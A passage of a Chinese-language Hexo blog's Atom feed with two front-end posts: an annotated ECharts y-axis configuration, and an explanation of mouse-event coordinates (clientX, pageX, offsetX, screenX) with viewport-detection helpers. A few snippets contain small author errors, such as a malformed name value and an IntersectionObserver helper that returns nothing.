&lt;figure class=&quot;high</summary>
      
    
    
    
    <category term="Vue" scheme="https://hisai3.github.io/hisai3.github.io/categories/Vue/"/>
    
    
    <category term="Vue" scheme="https://hisai3.github.io/hisai3.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>Echarts Y轴配置</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/Y%E8%BD%B4%E9%85%8D%E7%BD%AE/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/Y%E8%BD%B4%E9%85%8D%E7%BD%AE/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-01-15T07:17:16.657Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">yAxis</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>单位, <span class="comment">// 名称</span></span><br><span class="line">    <span class="attr">show</span>: <span class="literal">true</span>,    <span class="comment">// 是否显示 y 轴</span></span><br><span class="line">    <span class="attr">position</span>: <span class="string">&#x27;top&#x27;</span>,    <span class="comment">// y 轴的位置（&#x27;top&#x27;，&#x27;bottom&#x27;） </span></span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;category&#x27;</span>,    <span class="comment">// 坐标轴类型</span></span><br><span class="line">    <span class="attr">nameLocation</span>: <span class="string">&#x27;end&#x27;</span>,     <span class="comment">// 坐标轴名称显示位置</span></span><br><span class="line">    <span class="attr">nameGap</span>: <span class="number">15</span>,     <span class="comment">// 坐标轴名称与轴线之间的距离</span></span><br><span class="line">    <span class="attr">nameRotate</span>: <span class="number">10</span>,    <span class="comment">// 坐标轴名字旋转，角度值</span></span><br><span class="line">    <span class="attr">inverse</span>: <span class="literal">false</span>,    <span class="comment">// 是否是反向坐标轴</span></span><br><span class="line">    <span class="attr">nameTextStyle</span>: &#123;</span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;#333&#x27;</span>,     <span class="comment">// 坐标轴名称的颜色</span></span><br><span class="line">        <span class="attr">fontStyle</span>: <span class="string">&#x27;normal&#x27;</span>,    <span class="comment">// 文字字体的风格（&#x27;normal&#x27;，无样式；&#x27;italic&#x27;，斜体；&#x27;oblique&#x27;，倾斜字体） </span></span><br><span class="line">        <span class="attr">fontWeight</span>: <span class="string">&#x27;normal&#x27;</span>,    <span class="comment">// 文字字体的粗细（&#x27;normal&#x27;，无样式；&#x27;bold&#x27;，加粗；&#x27;bolder&#x27;，加粗的基础上再加粗；&#x27;lighter&#x27;，变细；数字定义粗细也可以，取值范围100至700）</span></span><br><span class="line">        <span class="attr">fontSize</span>: <span class="string">&#x27;20&#x27;</span>,    <span class="comment">// 文字字体大小</span></span><br><span class="line">        <span class="attr">align</span>: <span class="string">&#x27;left&#x27;</span>,     <span class="comment">// 文字水平对齐方式，默认自动（&#x27;left&#x27;，&#x27;center&#x27;，&#x27;right&#x27;）</span></span><br><span class="line">        <span class="attr">verticalAlign</span>: <span class="string">&#x27;left&#x27;</span>,    <span class="comment">// 文字垂直对齐方式，默认自动（&#x27;top&#x27;，&#x27;middle&#x27;，&#x27;bottom&#x27;</span></span><br><span class="line">        <span class="attr">lineHeight</span>: <span class="string">&#x27;50&#x27;</span>,    <span class="comment">// 行高 ）</span></span><br><span class="line">        <span class="attr">backgroundColor</span>: <span class="string">&#x27;red&#x27;</span>,    <span class="comment">// 文字块背景色，例：&#x27;#123234&#x27;, &#x27;red&#x27;, &#x27;rgba(0,23,11,0.3)&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">axisLine</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span>,    <span class="comment">// 是否显示坐标轴轴线</span></span><br><span class="line">        <span class="attr">symbol</span>: [<span class="string">&#x27;none&#x27;</span>, <span class="string">&#x27;arrow&#x27;</span>],     <span class="comment">// 轴线两端箭头，两个值，none表示没有箭头，arrow表示有箭头</span></span><br><span class="line">        <span class="attr">symbolSize</span>: [<span class="number">10</span>, <span class="number">15</span>],     <span class="comment">// 轴线两端箭头大小，数值一表示宽度，数值二表示高度</span></span><br><span class="line">        <span class="attr">lineStyle</span>: &#123;</span><br><span class="line">            <span class="attr">color</span>: <span class="string">&#x27;#333&#x27;</span>,    <span class="comment">// 坐标轴线线的颜色</span></span><br><span class="line">            <span class="attr">width</span>: <span class="string">&#x27;5&#x27;</span>,    <span class="comment">// 坐标轴线线宽</span></span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;solid&#x27;</span>,     <span class="comment">// 坐标轴线线的类型（&#x27;solid&#x27;，实线类型；&#x27;dashed&#x27;，虚线类型；&#x27;dotted&#x27;,点状类型）</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">axisTick</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span>,    <span class="comment">// 是否显示坐标轴刻度</span></span><br><span class="line">        <span class="attr">inside</span>: <span class="literal">true</span>,     <span class="comment">// 坐标轴刻度是否朝内，默认朝外</span></span><br><span class="line">        <span class="attr">length</span>: <span class="number">5</span>,    <span class="comment">// 坐标轴刻度的长度</span></span><br><span class="line">        <span class="attr">lineStyle</span>: &#123;</span><br><span class="line">            <span class="attr">color</span>: <span class="string">&#x27;#FFF&#x27;</span>,     <span class="comment">// 刻度线的颜色</span></span><br><span class="line">            <span class="attr">width</span>: <span class="number">10</span>,    <span class="comment">// 坐标轴刻度线宽</span></span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;solid&#x27;</span>,     <span class="comment">// 坐标轴线线的类型（&#x27;solid&#x27;，实线类型；&#x27;dashed&#x27;，虚线类型；&#x27;dotted&#x27;,点状类型）</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">axisLabel</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span>,     <span class="comment">// 是否显示刻度标签</span></span><br><span class="line">        <span class="attr">interval</span>: <span class="string">&#x27;0&#x27;</span>,    <span class="comment">// 坐标轴刻度标签的显示间隔，在类目轴中有效.0显示所有</span></span><br><span class="line">        <span class="attr">inside</span>: <span class="literal">true</span>,    <span class="comment">// 刻度标签是否朝内，默认朝外</span></span><br><span class="line">        <span class="attr">rotate</span>: <span class="number">90</span>,    <span class="comment">// 刻度标签旋转的角度，在类目轴的类目标签显示不下的时候可以通过旋转防止标签之间重叠；旋转的角度从 -90 度到 90 度</span></span><br><span class="line">        <span class="attr">margin</span>: <span class="number">10</span>,    <span class="comment">// 刻度标签与轴线之间的距离</span></span><br><span class="line">        <span class="comment">// formatter 刻度标签的内容格式器，支持字符串模板和回调函数两种形式</span></span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;#FFF&#x27;</span>,     <span class="comment">// 刻度标签文字的颜色</span></span><br><span class="line">        <span class="attr">fontStyle</span>: <span class="string">&#x27;normal&#x27;</span>,    <span class="comment">// 文字字体的风格（&#x27;normal&#x27;，无样式；&#x27;italic&#x27;，斜体；&#x27;oblique&#x27;，倾斜字体） </span></span><br><span class="line">        <span class="attr">fontWeight</span>: <span class="string">&#x27;normal&#x27;</span>,    <span class="comment">// 文字字体的粗细（&#x27;normal&#x27;，无样式；&#x27;bold&#x27;，加粗；&#x27;bolder&#x27;，加粗的基础上再加粗；&#x27;lighter&#x27;，变细；数字定义粗细也可以，取值范围100至700）</span></span><br><span class="line">        <span class="attr">fontSize</span>: <span class="string">&#x27;20&#x27;</span>,    <span class="comment">// 文字字体大小</span></span><br><span class="line">        <span class="attr">align</span>: <span class="string">&#x27;left&#x27;</span>,     <span class="comment">// 文字水平对齐方式，默认自动（&#x27;left&#x27;，&#x27;center&#x27;，&#x27;right&#x27;）</span></span><br><span class="line">        <span class="attr">verticalAlign</span>: <span class="string">&#x27;left&#x27;</span>,    <span class="comment">// 文字垂直对齐方式，默认自动（&#x27;top&#x27;，&#x27;middle&#x27;，&#x27;bottom&#x27;</span></span><br><span class="line">        <span class="attr">lineHeight</span>: <span class="string">&#x27;50&#x27;</span>,    <span class="comment">// 行高 ）</span></span><br><span class="line">        <span class="attr">backgroundColor</span>: <span class="string">&#x27;red&#x27;</span>,    <span class="comment">// 文字块背景色，例：&#x27;#123234&#x27;, &#x27;red&#x27;, &#x27;rgba(0,23,11,0.3)&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">splitLine</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span>,    <span class="comment">// 是否显示分隔线。默认数值轴显示，类目轴不显示</span></span><br><span class="line">        <span class="attr">interval</span>: <span class="string">&#x27;0&#x27;</span>,    <span class="comment">// 坐标轴刻度标签的显示间隔，在类目轴中有效.0显示所有</span></span><br><span class="line">        <span class="attr">color</span>: [<span class="string">&#x27;#ccc&#x27;</span>],    <span class="comment">// 分隔线颜色，可以设置成单个颜色，也可以设置成颜色数组，分隔线会按数组中颜色的顺序依次循环设置颜色</span></span><br><span class="line">        <span class="attr">width</span>: <span class="number">3</span>,    <span class="comment">// 分隔线线宽</span></span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;solid&#x27;</span>,     <span class="comment">// 坐标轴线线的类型（&#x27;solid&#x27;，实线类型；&#x27;dashed&#x27;，虚线类型；&#x27;dotted&#x27;,点状类型）</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">splitArea</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span>,    <span class="comment">// 是否显示分隔区域</span></span><br><span class="line">        <span class="attr">interval</span>: <span class="string">&#x27;0&#x27;</span>,    <span class="comment">// 坐标轴刻度标签的显示间隔，在类目轴中有效.0显示所有</span></span><br><span class="line">        <span class="attr">areaStyle</span>: &#123;</span><br><span class="line">            <span class="attr">color</span>: [<span class="string">&#x27;rgba(250,250,250,0.3)&#x27;</span>,<span class="string">&#x27;rgba(200,200,200,0.3)&#x27;</span>],    <span class="comment">// 分隔区域颜色。分隔区域会按数组中颜色的顺序依次循环设置颜色。默认是一个深浅的间隔色</span></span><br><span class="line">            <span class="attr">opacity</span>: <span class="number">1</span>,    <span class="comment">// 图形透明度。支持从 0 到 1 的数字，为 0 时不绘制该图形</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">textStyle</span>: &#123;</span><br><span class="line">            <span class="attr">color</span>: <span class="string">&#x27;#FFF&#x27;</span>,     <span class="comment">// 文字的颜色</span></span><br><span class="line">            <span class="attr">fontStyle</span>: <span class="string">&#x27;normal&#x27;</span>,    <span class="comment">// 文字字体的风格（&#x27;normal&#x27;，无样式；&#x27;italic&#x27;，斜体；&#x27;oblique&#x27;，倾斜字体） </span></span><br><span class="line">            <span class="attr">fontWeight</span>: <span class="string">&#x27;normal&#x27;</span>,    <span class="comment">// 文字字体的粗细（&#x27;normal&#x27;，无样式；&#x27;bold&#x27;，加粗；&#x27;bolder&#x27;，加粗的基础上再加粗；&#x27;lighter&#x27;，变细；数字定义粗细也可以，取值范围100至700）</span></span><br><span class="line">            <span class="attr">fontSize</span>: <span class="string">&#x27;20&#x27;</span>,    <span class="comment">// 文字字体大小</span></span><br><span class="line">            <span class="attr">align</span>: <span class="string">&#x27;left&#x27;</span>,     <span class="comment">// 文字水平对齐方式，默认自动（&#x27;left&#x27;，&#x27;center&#x27;，&#x27;right&#x27;）</span></span><br><span class="line">            <span class="attr">verticalAlign</span>: <span class="string">&#x27;left&#x27;</span>,    <span class="comment">// 文字垂直对齐方式，默认自动（&#x27;top&#x27;，&#x27;middle&#x27;，&#x27;bottom&#x27;</span></span><br><span class="line">            <span class="attr">lineHeight</span>: <span class="string">&#x27;50&#x27;</span>,    <span class="comment">// 行高 ）</span></span><br><span class="line">            <span class="attr">backgroundColor</span>: <span class="string">&#x27;red&#x27;</span>,    <span class="comment">// 文字块背景色，例：&#x27;#123234&#x27;, &#x27;red&#x27;, &#x27;rgba(0,23,11,0.3)&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="Echarts" scheme="https://hisai3.github.io/hisai3.github.io/categories/Echarts/"/>
    
    
    <category term="Echarts" scheme="https://hisai3.github.io/hisai3.github.io/tags/Echarts/"/>
    
  </entry>
  
  <entry>
    <title>client,screen,page,offset的区别</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/client,screen,page,offset%E7%9A%84%E5%8C%BA%E5%88%AB%20/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/client,screen,page,offset%E7%9A%84%E5%8C%BA%E5%88%AB%20/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-11-13T05:49:11.010Z</updated>
    
    <content type="html"><![CDATA[<h4 id="offsetX-clientX-pageX-screenX"><a href="#offsetX-clientX-pageX-screenX" class="headerlink" title="offsetX, clientX, pageX, screenX"></a>offsetX, clientX, pageX, screenX</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">5000px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: chocolate;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span>bb<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 如果没有滚动条 三个都一样</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// client 以页面的可视区域为参照 跟滚动条没关系</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// offset 以页面的当前点击元素的内容(content + padding)为参照</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// page 以页面的html为参照</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// screen 以电脑屏幕为参照</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;e--&gt;&gt;&gt;&gt;&#x27;</span>, e.<span class="property">pageY</span>, e.<span class="property">offsetY</span>, e.<span class="property">clientY</span>, e.<span class="property">screenY</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>图解</strong><br><img src="https://gitee.com/hisai/image-bed/raw/master/offsetX.png" alt="offsetX"></p><p><code>offsetTop</code> 是相对于最近的定位父元素</p><h3 id="判断元素是否在可视范围内"><a href="#判断元素是否在可视范围内" class="headerlink" title="判断元素是否在可视范围内"></a>判断元素是否在可视范围内</h3><h4 id="1-scrollTop-与-offsetTop"><a href="#1-scrollTop-与-offsetTop" class="headerlink" title="1. scrollTop 与 offsetTop"></a>1. <strong>scrollTop</strong> 与 <strong>offsetTop</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isInViewport</span>(<span class="params">element</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> scrollTop = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> || <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span>;</span><br><span class="line">  <span class="keyword">const</span> offsetTop = element.<span class="property">offsetTop</span>;</span><br><span class="line">  <span class="keyword">const</span> windowHeight = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line">  <span class="keyword">const</span> elementHeight = element.<span class="property">offsetHeight</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    offsetTop - scrollTop &lt; windowHeight &amp;&amp;</span><br><span class="line">    offsetTop - scrollTop + elementHeight &gt; <span class="number">0</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-getBoundingClientRect"><a href="#2-getBoundingClientRect" class="headerlink" title="2. getBoundingClientRect"></a>2. <strong>getBoundingClientRect</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isInViewport</span>(<span class="params">element</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> rect = element.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    rect.<span class="property">top</span> &lt; <span class="variable language_">window</span>.<span class="property">innerHeight</span> &amp;&amp;</span><br><span class="line">    rect.<span class="property">bottom</span> &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">    rect.<span class="property">left</span> &lt; <span class="variable language_">window</span>.<span class="property">innerWidth</span> &amp;&amp;</span><br><span class="line">    rect.<span class="property">right</span> &gt; <span class="number">0</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-IntersectionObserver"><a href="#3-IntersectionObserver" class="headerlink" title="3. IntersectionObserver"></a>3. <strong>IntersectionObserver</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isInViewport</span>(<span class="params">element</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> observer = <span class="keyword">new</span> <span class="title class_">IntersectionObserver</span>(</span><br><span class="line">    <span class="function">(<span class="params">[entry]</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> entry.<span class="property">isIntersecting</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">root</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">rootMargin</span>: <span class="string">&#x27;0px&#x27;</span>,</span><br><span class="line">      <span class="attr">threshold</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  observer.<span class="title function_">observe</span>(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">client,screen,page,offset的区别</summary>
    
    
    
    <category term="随记" scheme="https://hisai3.github.io/hisai3.github.io/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
    <category term="html" scheme="https://hisai3.github.io/hisai3.github.io/tags/html/"/>
    
  </entry>
  
</feed>
